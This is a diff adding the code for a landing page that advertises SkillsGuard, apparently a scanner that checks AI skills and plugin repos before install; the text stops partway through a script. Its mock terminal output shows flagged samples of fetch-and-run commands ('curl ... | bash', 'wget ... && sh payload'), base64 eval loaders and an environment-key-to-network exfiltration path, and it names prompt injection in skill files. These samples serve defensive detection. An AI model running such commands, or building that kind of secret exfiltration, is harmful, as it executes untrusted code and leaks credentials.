+    .footer-cta-small {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 10px 20px;
+      background: var(--black);
+      color: var(--white);
+      border-radius: 0;
+      font-family: 'Geist', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .footer-columns {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 32px;
+      padding: 40px 0;
+      border-top: 1px solid var(--gray-200);
+    }
+    .footer-col h6 {
+      font-family: 'Geist', sans-serif;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--black);
+      margin-bottom: 16px;
+    }
+    .footer-col ul li {
+      margin-bottom: 10px;
+    }
+    .footer-col ul li a {
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      color: var(--gray-500);
+      transition: color 0.2s;
+    }
+    .footer-col ul li a:hover { color: var(--black); }
+    .footer-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 0;
+      border-top: 1px solid var(--gray-200);
+    }
+    .footer-bottom p {
+      font-family: 'Geist', sans-serif;
+      font-size: 12px;
+      color: var(--gray-500);
+    }
+    .footer-bottom .location {
+      font-family: 'DM Sans', sans-serif;
+      font-size: 12px;
+      color: var(--gray-500);
+    }
+    @media (max-width: 768px) {
+      .footer-columns { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    /* ===== 13. HUGE WATERMARK ===== */
+    .watermark {
+      padding: 40px 0 0;
+      text-align: center;
+      overflow: hidden;
+    }
+    .watermark span {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 700;
+      font-size: clamp(80px, 14vw, 200px);
+      color: var(--gray-100);
+      letter-spacing: 0.05em;
+      line-height: 0.85;
+      display: block;
+      user-select: none;
+      transform: translateY(20%);
+    }
+
+    /* ===== ANIMATIONS ===== */
+    .fade-in {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+    .fade-in.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.150.0/build/three.min.js"></script>
+</head>
+<body>
+
+  <!-- 1. ANNOUNCEMENT BAR -->
+  <div class="announcement">
+    <a href="#features">New: SkillsGuard v1.0 — Pre-install security scanning for AI skills &rarr;</a>
+  </div>
+
+  <!-- 2. NAVBAR -->
+  <nav class="navbar">
+    <a href="#" class="nav-logo">
+      <img src="Logo.png" class="nav-logo-icon" alt="SkillsGuard">
+      <span class="nav-logo-text">SkillsGuard</span>
+    </a>
+    <button class="nav-hamburger" aria-label="Menu">
+      <span></span><span></span><span></span>
+    </button>
+  </nav>
+
+  <!-- 3. HERO -->
+  <section class="hero">
+    <canvas id="plexus-canvas"></canvas>
+    <canvas id="globe-canvas"></canvas>
+    <div class="hero-overlay"></div>
+    <div class="hero-content">
+      <h1>Your pre-install scanner for securing AI skills</h1>
+      <p>SkillsGuard gives developers an explainable risk report for AI skills, agent tools, and plugin repos before they run them. Vibes aren't a security model.</p>
+      <div class="hero-buttons">
+        <a href="#features" class="btn-outline-white">Try the CLI &rarr;</a>
+        <a href="#how-it-works" class="btn-solid-black">See how it works &rarr;</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 4. SOCIAL PROOF / VALUE PROPS -->
+  <section class="customers">
+    <h6>Everything you install is an attack surface</h6>
+    <div class="clients-grid">
+      <span class="client-logo-text">Static Analysis</span>
+      <span class="client-logo-text">Taint Tracking</span>
+      <span class="client-logo-text">YARA Pattern Engine</span>
+      <span class="client-logo-text">LLM Semantic Analysis</span>
+      <span class="client-logo-text">Explainable Findings</span>
+      <span class="client-logo-text">CLI-First</span>
+    </div>
+  </section>
+
+  <!-- 5. FEATURE HIGHLIGHT -->
+  <section class="feature-highlight" id="features">
+    <div class="feature-highlight-header">
+      <h2>New: CLI Risk Scanner</h2>
+      <a href="#" class="learn-link">Learn more &rarr;</a>
+    </div>
+    <div class="cli-showcase">
+      <div class="cli-terminal" id="cli-terminal">
+        <div class="cli-titlebar">
+          <div class="cli-dot red"></div>
+          <div class="cli-dot yellow"></div>
+          <div class="cli-dot green"></div>
+          <span class="cli-titlebar-text">Terminal</span>
+        </div>
+        <div class="cli-body" id="cli-body"></div>
+      </div>
+    </div>
+    <p class="feature-desc">Our scanner ranks skills by risk score, surfacing capabilities, red flags, and inspectability gaps so you know which repos are safe to install. Stop trusting vibes and focus on evidence-based decisions.</p>
+  </section>
+
+  <!-- 6. SCROLLING FEATURE CARDS -->
+  <section class="features-scroll">
+
+    <!-- Card 1: image left, text right -->
+    <div class="feature-card-row fade-in">
+      <div class="feature-card-image" style="background-image: url('blue.png')">
+        <div class="overlay-container">
+          <div class="overlay-stack">
+            <div class="overlay-panel overlay-alert" style="transition-delay: 0s;">
+              <span class="alert-dot red"></span>
+              <span class="alert-label">CURL_PIPE_SH</span>
+              <span class="alert-path">install.sh:14</span>
+            </div>
+            <div class="overlay-panel overlay-alert" style="transition-delay: 0.2s;">
+              <span class="alert-dot red"></span>
+              <span class="alert-label">BASE64_EXEC</span>
+              <span class="alert-path">loader.js:42</span>
+            </div>
+            <div class="overlay-panel overlay-alert" style="transition-delay: 0.4s;">
+              <span class="alert-dot yellow"></span>
+              <span class="alert-label">POSTINSTALL_EXEC</span>
+              <span class="alert-path">package.json:8</span>
+            </div>
+            <div class="overlay-panel overlay-alert" style="transition-delay: 0.6s;">
+              <span class="alert-dot red"></span>
+              <span class="alert-label">YARA_MATCH</span>
+              <span class="alert-path">SKILL.md:23</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="feature-card-text">
+        <h3>Automatically detect red flags</h3>
+        <p>SkillsGuard catches high-risk patterns like <code>curl | bash</code>, obfuscated execution, runtime download-and-exec, persistence mechanisms, and suspicious postinstall scripts before they ever run on your machine.</p>
+        <a href="#" class="learn-link">Learn more ></a>
+      </div>
+    </div>
+
+    <!-- Card 2: image left, text right -->
+    <div class="feature-card-row fade-in">
+      <div class="feature-card-image" style="background-image: url('orange.png')">
+        <div class="overlay-container">
+          <div class="overlay-panel overlay-yaml" style="transition-delay: 0.1s;">
+            <div class="yaml-header">.github/workflows/ci.yml</div>
+            <div class="yaml-body">
+              <div class="yaml-line"><span class="alert-dot red"></span><span class="yaml-key">uses:</span> actions/checkout@main</div>
+              <div class="yaml-line"><span class="alert-dot red"></span><span class="yaml-key">uses:</span> docker://alpine:latest</div>
+              <div class="yaml-line"><span class="alert-dot yellow"></span><span class="yaml-key">run:</span> curl -sL https://… | sh</div>
+              <div class="yaml-line"><span class="alert-dot green"></span><span class="yaml-key">uses:</span> actions/setup-node@v4.2.0</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="feature-card-text">
+        <h3>Scan GitHub Actions as execution surfaces</h3>
+        <p>Every <code>uses:</code> directive is remote code execution by design. SkillsGuard flags unpinned actions, docker-based actions, composite actions, and suspicious shell commands in CI workflows.</p>
+        <a href="#" class="learn-link">Learn more ></a>
+      </div>
+    </div>
+
+    <!-- Card 3: image left, text right -->
+    <div class="feature-card-row fade-in">
+      <div class="feature-card-image" style="background-image: url('blue.png')">
+        <div class="overlay-container">
+          <div class="overlay-panel overlay-dataflow" style="transition-delay: 0.1s;">
+            <div class="dataflow-header">Taint Tracking &mdash; Source &rarr; Sink</div>
+            <div class="dataflow-row">
+              <span class="dataflow-source">ENV_READ</span>
+              <span class="dataflow-arrow">&rarr;</span>
+              <span class="dataflow-sink">NETWORK_EGRESS</span>
+              <span class="dataflow-severity high">HIGH</span>
+            </div>
+            <div class="dataflow-row">
+              <span class="dataflow-source">CRED_FILE</span>
+              <span class="dataflow-arrow">&rarr;</span>
+              <span class="dataflow-sink">SHELL_EXEC</span>
+              <span class="dataflow-severity high">HIGH</span>
+            </div>
+            <div class="dataflow-row">
+              <span class="dataflow-source">FS_READ</span>
+              <span class="dataflow-arrow">&rarr;</span>
+              <span class="dataflow-sink">EVAL</span>
+              <span class="dataflow-severity med">MED</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="feature-card-text">
+        <h3>Dataflow analysis and capability mapping</h3>
+        <p>Static taint tracking follows data from sources like environment variables and credential files to sinks like network egress and eval. Capability detection maps shell execution, filesystem writes, and sensitive path access &mdash; context determines risk.</p>
+        <a href="#" class="learn-link">Learn more ></a>
+      </div>
+    </div>
+
+    <!-- Card 4: image left, text right -->
+    <div class="feature-card-row fade-in">
+      <div class="feature-card-image" style="background-image: url('orange.png')">
+        <div class="overlay-container">
+          <div class="overlay-panel overlay-semantic" style="transition-delay: 0.1s;">
+            <div class="semantic-header">Semantic Analysis</div>
+            <div class="semantic-row">
+              <span class="alert-dot red"></span>
+              <span class="semantic-label">PROMPT_INJECTION</span>
+              <span class="semantic-path">SKILL.md:45</span>
+              <span class="semantic-tag high">HIGH</span>
+            </div>
+            <div class="semantic-row">
+              <span class="alert-dot yellow"></span>
+              <span class="semantic-label">DESC_MISMATCH</span>
+              <span class="semantic-path">manifest</span>
+              <span class="semantic-tag med">MED</span>
+            </div>
+            <div class="semantic-row">
+              <span class="alert-dot yellow"></span>
+              <span class="semantic-label">OPAQUE_BINARY</span>
+              <span class="semantic-path">vendor/tool.so</span>
+              <span class="semantic-tag med">MED</span>
+            </div>
+            <div class="semantic-meta">&rarr; 1 false positive removed by meta-engine</div>
+          </div>
+        </div>
+      </div>
+      <div class="feature-card-text">
+        <h3>LLM semantic analysis and inspectability</h3>
+        <p>An optional LLM engine acts as a security judge &mdash; analyzing skill manifests, instructions, and code for semantic threats like prompt injection, description-behavior mismatches, and hidden intent. Opaque binaries and packed code are also flagged as trust gaps.</p>
+        <a href="#" class="learn-link">Learn more ></a>
+      </div>
+    </div>
+
+  </section>
+
+  <!-- 7. QUOTE + STATS - DELETED-->
+
+  <!-- 8. WARM GRADIENT SECTION -->
+  <section class="personalization" id="how-it-works">
+    <div class="personalization-inner">
+      <div class="personalization-header">
+        <h2>The most comprehensive<br>pre-install scanner</h2>
+        <p>SkillsGuard scans every execution surface — not just source code. From npm scripts to GitHub Actions to lockfiles, all findings are explainable and evidence-backed.</p>
+        <a href="#" class="learn-link">Learn more &rarr;</a>
+      </div>
+      <div class="personalization-content fade-in">
+        <div class="personalization-screenshot">
+          <div class="overlay-container">
+            <div class="overlay-panel overlay-report" style="transition-delay: 0.1s;">
+              <div class="report-header">Combined Risk Report</div>
+              <div class="report-row"><span class="alert-dot red"></span><span class="report-label">Red Flags</span><span class="report-value">4 found</span></div>
+              <div class="report-row"><span class="alert-dot red"></span><span class="report-label">Dataflow</span><span class="report-value">1 taint path</span></div>
+              <div class="report-row"><span class="alert-dot yellow"></span><span class="report-label">Semantic</span><span class="report-value">2 threats</span></div>
+              <div class="report-row"><span class="alert-dot green"></span><span class="report-label">Meta</span><span class="report-value">1 FP removed</span></div>
+              <div class="report-score"><span class="report-score-label">Risk Score</span><span class="report-score-value">7.2 / 10</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-label">Step 1</div>
+            <h4>Point at any repo</h4>
+            <p>Pass a GitHub URL or local path. SkillsGuard clones to a temp sandbox and begins static analysis immediately.</p>
+          </div>
+          <div class="step-item">
+            <div class="step-label">Step 2</div>
+            <h4>Two layers of analysis</h4>
+            <p>Layer 1 runs fast: red flags, capabilities, GitHub Actions, and inspectability in seconds. Layer 2 goes deep: YARA pattern matching, Python AST taint tracking, and optional LLM semantic analysis on the skill manifest.</p>
+          </div>
+          <div class="step-item">
+            <div class="step-label">Start Scanning</div>
+            <h4>Decide with evidence</h4>
+            <p>Every finding includes severity, confidence, file path, line number, evidence excerpt, and remediation guidance. A meta-engine filters false positives so you only see what matters.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 9. METHOD GRID -->
+  <section class="method">
+    <div class="method-inner">
+      <h2>The SkillsGuard Method</h2>
+      <div class="method-grid">
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.1s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">shell-scan</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">skillguard</span> scan --surface shell</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line">  <span class="t-red">FAIL</span>  curl -fsSL | bash       <span class="t-dim">install.sh:3</span></div>
+              <div class="method-term-line">  <span class="t-red">FAIL</span>  wget -q &amp;&amp; sh payload  <span class="t-dim">setup.sh:17</span></div>
+              <div class="method-term-line">  <span class="t-yellow">WARN</span>  eval "$PAYLOAD"         <span class="t-dim">run.sh:42</span></div>
+              <div class="method-term-line"><span class="t-dim">  3 findings (2 high, 1 medium)</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>Scan shell scripts</h4>
+            <p>Detect curl|bash, wget|sh, and dangerous patterns in .sh, Makefile, Dockerfile, and more.</p>
+          </div>
+        </div>
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.2s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">gha-audit</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">skillguard</span> scan --surface gha</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line">  <span class="t-red">FAIL</span>  uses: actions/checkout@main  <span class="t-dim">unpinned</span></div>
+              <div class="method-term-line">  <span class="t-red">FAIL</span>  uses: docker://alpine:latest <span class="t-dim">container</span></div>
+              <div class="method-term-line">  <span class="t-yellow">WARN</span>  run: curl -sL | sh          <span class="t-dim">shell-exec</span></div>
+              <div class="method-term-line">  <span class="t-green">PASS</span>  uses: actions/setup-node@a5e <span class="t-dim">pinned</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>Flag GitHub Actions</h4>
+            <p>Detect unpinned uses:, docker:// actions, and suspicious run: shell commands in CI.</p>
+          </div>
+        </div>
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.15s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">skill-parse</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">sgscanner</span> inspect --engine pattern</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line"><span class="t-dim">  Parsing SKILL.md frontmatter...</span></div>
+              <div class="method-term-line">  name: agent-toolkit         <span class="t-green">✓</span></div>
+              <div class="method-term-line">  description: "A helpful..." <span class="t-yellow">WARN</span>  <span class="t-dim">generic</span></div>
+              <div class="method-term-line">  allowed-tools: [shell, fs]  <span class="t-green">✓</span></div>
+              <div class="method-term-line"><span class="t-dim">  Instruction body scanned    2 patterns</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>Parse SKILL.md manifests</h4>
+            <p>Extract and validate frontmatter fields, scan instruction bodies for prompt injection patterns, and discover all referenced files.</p>
+          </div>
+        </div>
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.25s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">taint-trace</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">sgscanner</span> inspect --dataflow</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line"><span class="t-dim">  Building CFG for 12 Python files...</span></div>
+              <div class="method-term-line">  Source: <span class="t-blue">os.environ["API_KEY"]</span>  <span class="t-dim">loader.py:8</span></div>
+              <div class="method-term-line">  Sink:   <span class="t-red">requests.post(url, key)</span> <span class="t-dim">exfil.py:23</span></div>
+              <div class="method-term-line">  <span class="t-red">TAINT_PATH</span>  env &rarr; network    <span class="t-red">HIGH</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>Track dataflow and taint</h4>
+            <p>Python AST analysis builds control flow graphs, traces data from environment variables and credential files to network sinks and eval calls.</p>
+          </div>
+        </div>
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.2s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">llm-judge</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">sgscanner</span> inspect --llm</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line"><span class="t-dim">  Analyzing with semantic engine...</span></div>
+              <div class="method-term-line">  <span class="t-red">PROMPT_INJECTION</span>  <span class="t-dim">SKILL.md:45</span>    <span class="t-red">HIGH</span></div>
+              <div class="method-term-line">  <span class="t-yellow">DESC_MISMATCH</span>     <span class="t-dim">manifest</span>       <span class="t-yellow">MED</span></div>
+              <div class="method-term-line">  <span class="t-yellow">HIDDEN_INTENT</span>     <span class="t-dim">run.py:12</span>      <span class="t-yellow">MED</span></div>
+              <div class="method-term-line"><span class="t-dim">  3 semantic findings</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>LLM semantic analysis</h4>
+            <p>An AI security judge analyzes skill manifests, instructions, and code for semantic threats invisible to pattern matching.</p>
+          </div>
+        </div>
+        <div class="method-card fade-in" style="background-image: url('orange.png')">
+          <div class="method-card-panel" style="transition-delay: 0.15s;">
+            <div class="method-term-bar">
+              <div class="method-term-dot red"></div>
+              <div class="method-term-dot yellow"></div>
+              <div class="method-term-dot green"></div>
+              <span class="method-term-title">meta-report</span>
+            </div>
+            <div class="method-term-body">
+              <div class="method-term-line"><span class="t-green">$</span> <span class="t-blue">sgscanner</span> inspect --meta</div>
+              <div class="method-term-line"></div>
+              <div class="method-term-line"><span class="t-dim">  Meta-analysis on 7 findings...</span></div>
+              <div class="method-term-line">  FP removed:  <span class="t-green">1</span> <span class="t-dim">(SHELL_EXEC benign)</span></div>
+              <div class="method-term-line">  Correlated:  <span class="t-blue">2</span> <span class="t-dim">findings merged</span></div>
+              <div class="method-term-line">  Remediation: <span class="t-green">4</span> <span class="t-dim">actions generated</span></div>
+              <div class="method-term-line">  Final: <span class="t-green">0 CRITICAL</span>, <span class="t-red">2 HIGH</span>, <span class="t-yellow">3 MEDIUM</span></div>
+            </div>
+          </div>
+          <div class="method-card-overlay"></div>
+          <div class="method-card-content">
+            <h4>Meta-analysis and remediation</h4>
+            <p>A second-pass engine validates findings, filters false positives, correlates related issues, and generates remediation guidance.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 10. JOIN US / TEAM CTA DELETED -->
+
+  <!-- 11. COLLABORATIVE AI FOOTER CTA -->
+  <section class="footer-cta">
+    <img class="footer-cta-bg" src="https://framerusercontent.com/images/oIS9lwSoFMPFyqzd7Q7zSGkE.jpg" alt="">
+    <div class="footer-cta-overlay"></div>
+    <div class="footer-cta-content">
+      <h2>Meet the pre-install scanner for AI skills.</h2>
+      <p>Signal through the noise.</p>
+      <div class="footer-cta-buttons">
+        <a href="#" class="btn-large-white">Get started &rarr;</a>
+        <a href="#" class="btn-outline-white-lg">GitHub</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 12. FOOTER -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-top">
+        <div class="footer-logo">
+          <img src="Logo.png" width="20" height="20" alt="SkillsGuard">
+          <span class="footer-logo-text">SkillsGuard</span>
+        </div>
+        <a href="#" class="footer-cta-small">Get Started &rarr;</a>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 SkillsGuard. All rights reserved.</p>
+        <p class="location">Open Source</p>
+      </div>
+
+      <!-- 13. HUGE WATERMARK -->
+      <div class="watermark">
+        <span>SKILLSGUARD</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- SCROLL ANIMATION + CLI TERMINAL -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Fade-in observer
+      const fadeObserver = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) entry.target.classList.add('visible');
+        });
+      }, { threshold: 0.08, rootMargin: '0px 0px -30px 0px' });
+      document.querySelectorAll('.fade-in').forEach(el => fadeObserver.observe(el));
+
+      // Overlay panel observer — triggers .visible on overlay-panel elements
+      const overlayObserver = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.querySelectorAll('.overlay-panel').forEach(panel => {
+              panel.classList.add('visible');
+            });
+          }
+        });
+      }, { threshold: 0.25, rootMargin: '0px 0px -40px 0px' });
+      document.querySelectorAll('.feature-card-image').forEach(el => overlayObserver.observe(el));
+      document.querySelectorAll('.personalization-screenshot').forEach(el => overlayObserver.observe(el));
+
+      // Method card panel observer — triggers .visible on method-card-panel elements
+      const methodPanelObserver = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.querySelectorAll('.method-card-panel').forEach(panel => {
+              panel.classList.add('visible');
+            });
+          }
+        });
+      }, { threshold: 0.3, rootMargin: '0px 0px -40px 0px' });
+      document.querySelectorAll('.method-card').forEach(el => methodPanelObserver.observe(el));
+
+      // CLI showcase observer — float in the terminal panel
+      const cliShowcaseObserver = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            const terminal = entry.target.querySelector('.cli-terminal');
+            if (terminal) terminal.classList.add('visible');
+          }
+        });
+      }, { threshold: 0.2 });
+      const cliShowcase = document.querySelector('.cli-showcase');
+      if (cliShowcase) cliShowcaseObserver.observe(cliShowcase);
+
+      // === CLI Terminal Animation ===
+      const cliBody = document.getElementById('cli-body');
+      if (!cliBody) return;
+      let terminalPlayed = false;
+
+      function h(tag, cls, text) {
+        const el = document.createElement(tag);
+        if (cls) el.className = cls;
+        if (text !== undefined) el.innerHTML = text;
+        return el;
+      }
+
+      function addLine(html) {
+        const line = h('div', 'cli-line', html);
+        cliBody.appendChild(line);
+        cliBody.scrollTop = cliBody.scrollHeight;
+        return line;
+      }
+
+      function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+      async function typeText(container, text, speed) {
+        for (let i = 0; i < text.length; i++) {
+          container.innerHTML += text[i];
+          cliBody.scrollTop = cliBody.scrollHeight;
+          await wait(speed);
+        }
+      }
+
+      async function runTerminal() {
+        if (terminalPlayed) return;
+        terminalPlayed = true;
+        cliBody.innerHTML = '';
+
+        // Phase 1: Type the command
+        const cmdLine = addLine('<span class="t-green">$</span> ');
+        const cmdSpan = h('span', 't-white', '');
+        cmdLine.appendChild(cmdSpan);
+        const cursor = h('span', 'cli-cursor', '');
+        cmdLine.appendChild(cursor);
+
+        const cmd = 'skillguard scan github.com/sketchy-dev/agent-toolkit --purpose agent_skill';
+        for (let i = 0; i < cmd.length; i++) {
+          // Color different parts
+          let ch = cmd[i];
+          if (i < 14) cmdSpan.innerHTML += '<span class="t-blue">' + ch + '</span>'; // "skillguard sca"... wait, simpler approach
+          else cmdSpan.innerHTML += ch;
+          cliBody.scrollTop = cliBody.scrollHeight;
+          await wait(35);
+        }
+        cursor.remove();
+        // Recolor the command properly
+        cmdLine.innerHTML = '<span class="t-green">$</span> <span class="t-blue">skillguard</span> <span class="t-purple">scan</span> <span class="t-white">github.com/sketchy-dev/agent-toolkit</span> <span class="t-purple">--purpose</span> <span class="t-yellow">agent_skill</span>';
+
+        await wait(400);
+
+        // Phase 2: Scanning output
+        addLine('');
+        addLine('<span class="t-dim">  Cloning into temp sandbox...</span>');
+        await wait(600);
+        addLine('<span class="t-dim">  Scanning 63 files across 4 surfaces...</span>');
+        await wait(400);
+        addLine('');
+        await wait(150);
+        addLine('<span class="t-dim">  package.json</span>    <span class="t-green">████████</span><span class="t-dim">░░</span>  <span class="t-white">scripts detected</span>');
+        await wait(150);
+        addLine('<span class="t-dim">  .github/</span>        <span class="t-green">████████████</span> <span class="t-white">3 workflows</span>');
+        await wait(150);
+        addLine('<span class="t-dim">  src/</span>            <span class="t-yellow">██████</span><span class="t-dim">░░░░</span>  <span class="t-white">42 source files</span>');
+        await wait(150);
+        addLine('<span class="t-dim">  install.sh</span>      <span class="t-red">████████████</span> <span class="t-white">shell script</span>');
+
+        await wait(700);
+
+        // Phase 3: Report header
+        addLine('');
+        addLine('<span class="t-header">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+        addLine('<span class="t-bold">  SkillsGuard Risk Report</span>');
+        addLine('<span class="t-header">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+        await wait(300);
+        addLine('');
+        addLine('<span class="t-dim">  Repo:</span>      <span class="t-white">sketchy-dev/agent-toolkit</span>');
+        addLine('<span class="t-dim">  Purpose:</span>   <span class="t-white">agent_skill</span>');
+        addLine('<span class="t-dim">  Scanned:</span>   <span class="t-white">63 files in 1.4s</span>');
+
+        await wait(800);
+
+        // Phase 4: Risk level (dramatic)
+        addLine('');
+        addLine('<span class="t-bold">  Risk Level: </span><span class="t-red">█████████░  HIGH</span>');
+
+        await wait(600);
+
+        // Phase 5: Findings
+        addLine('');
+        addLine('<span class="t-bold">  Red Flags:</span>');
+        await wait(300);
+        addLine('<span class="t-red">  ✗ CURL_PIPE_SH</span>        <span class="t-dim">install.sh:14</span>');
+        addLine('<span class="t-white">    curl -fsSL https://cdn.example.com/setup | bash</span>');
+        await wait(300);
+        addLine('<span class="t-red">  ✗ BASE64_EXEC</span>         <span class="t-dim">src/loader.js:42</span>');
+        addLine('<span class="t-white">    eval(atob(encoded_payload))</span>');
+        await wait(300);
+        addLine('<span class="t-red">  ✗ GHA_USES_UNPINNED</span>   <span class="t-dim">.github/workflows/ci.yml:18</span>');
+        addLine('<span class="t-white">    uses: actions/checkout@main</span>');
+        await wait(300);
+        addLine('<span class="t-yellow">  ⚠ POSTINSTALL_EXEC</span>   <span class="t-dim">package.json → postinstall</span>');
+        addLine('<span class="t-white">    node scripts/setup.js</span>');
+
+        await wait(400);
+        addLine('');
+        addLine('<span class="t-bold">  Capabilities:</span>');
+        await wait(200);
+        addLine('<span class="t-blue">  ● SHELL_EXEC</span>          <span class="t-dim">3 files</span>');
+        await wait(150);
+        addLine('<span class="t-blue">  ● NETWORK_EGRESS</span>      <span class="t-dim">5 files</span>');
+        await wait(150);
+        addLine('<span class="t-blue">  ● FS_WRITE</span>            <span class="t-dim">2 files</span>');
+        await wait(150);
+        addLine('<span class="t-blue">  ● ENV_READ</span>            <span class="t-dim">GITHUB_TOKEN, AWS_SECRET_KEY</span>');
+
+        await wait(400);
+        addLine('');
+        addLine('<span class="t-bold">  Inspectability:</span>');
+        await wait(200);
+        addLine('<span class="t-yellow">  ⚠ OPAQUE_BINARY</span>      <span class="t-dim">vendor/tool.so</span>');
+        await wait(200);
+        addLine('<span class="t-yellow">  ⚠ PACKED_OR_MINIFIED</span> <span class="t-dim">dist/bundle.min.js (188KB, 1 line)</span>');
+
+        await wait(500);
+
+        // Phase 6: Disclaimer
+        addLine('');
+        addLine('<span class="t-dim">  ⓘ Static analysis only — code was never executed.</span>');
+
+        await wait(1000);
+
+        // Phase 7: Layer 2 — Deep Skill Analysis (sgscanner)
+        addLine('');
+        addLine('<span class="t-header">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+        addLine('<span class="t-bold">  Deep Skill Analysis (sgscanner)</span>');
+        addLine('<span class="t-header">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>');
+
+        await wait(400);
+        addLine('');
+        addLine('<span class="t-green">  ✓</span> <span class="t-white">SKILL.md manifest parsed</span>');
+        await wait(500);
+        addLine('<span class="t-dim">  Running pattern engine (YARA + regex)...</span>   <span class="t-yellow">4 findings</span>');
+        await wait(600);
+        addLine('<span class="t-dim">  Running dataflow engine (taint tracking)...</span> <span class="t-red">1 finding</span>');
+        await wait(700);
+        addLine('<span class="t-dim">  Running LLM semantic analysis...</span>           <span class="t-yellow">2 findings</span>');
+        await wait(800);
+        addLine('<span class="t-dim">  Running meta-analysis (false positive filter)...</span>');
+        await wait(500);
+        addLine('<span class="t-green">    → 1 false positive removed</span>');
+
+        await wait(600);
+        addLine('');
+        addLine('<span class="t-bold">  Issues:</span> <span class="t-green">0 CRITICAL</span>, <span class="t-red">2 HIGH</span>, <span class="t-yellow">4 MEDIUM</span>');
+        addLine('<span class="t-dim">  Remediation available for all findings.</span>');
+
+        // Blinking cursor at end
+        const lastLine = addLine('');
+        lastLine.appendChild(h('span', 'cli-cursor', ''));
+      }
+
+      // Start animation after a short delay (plays once)
+      setTimeout(() => { if (!terminalPlayed) runTerminal(); }, 1500);
+    });
+  </script>
+
+  <!-- PLEXUS INTERACTIVE BACKGROUND -->
+  <script>
+  (function() {
+    const canvas = document.getElementById('plexus-canvas');
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    const hero = canvas.closest('.hero');
